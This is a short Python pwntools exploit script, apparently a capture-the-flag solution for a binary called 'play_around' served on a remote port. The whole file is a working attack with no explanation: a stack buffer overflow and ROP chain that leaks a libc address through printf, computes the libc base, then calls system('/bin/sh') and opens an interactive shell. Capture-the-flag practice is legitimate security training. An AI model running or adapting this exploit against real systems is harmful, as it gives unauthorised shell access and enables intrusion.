from pwn import * 
sh = process("./play_around") 
sh = remote("bksec.team", 4325)
bin = ELF("./play_around") 
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6") 


# gdb.attach(sh, "b * 0x40066D")

# pause()
pop_rdi = p64(0x400733)      # pop rdi; ret ; 
vuln = 0x400638     
printf_got = p64(0x601020)
ret = p64(0x40050e) 

print sh.recv() 

payload = "a" * (0x80 + 8) + ret + pop_rdi + p64(0x601018) + p64(bin.sym['printf']) + ret + p64(bin.sym['vuln'])
assert len(payload) <= 0x100  
sh.send(payload) 
set_buf = u64(sh.recv(6) + "\0\0") 
libc.address = set_buf - libc.sym['setbuf'] 
log.success("Libc = " + hex(libc.address)) 
system = libc.sym['system'] 
binsh = next(libc.search('/bin/sh')) 

payload = "a" * (0x80 + 8) + ret + pop_rdi + p64(binsh) + p64(system) 
sh.send(payload)
sh.interactive() 

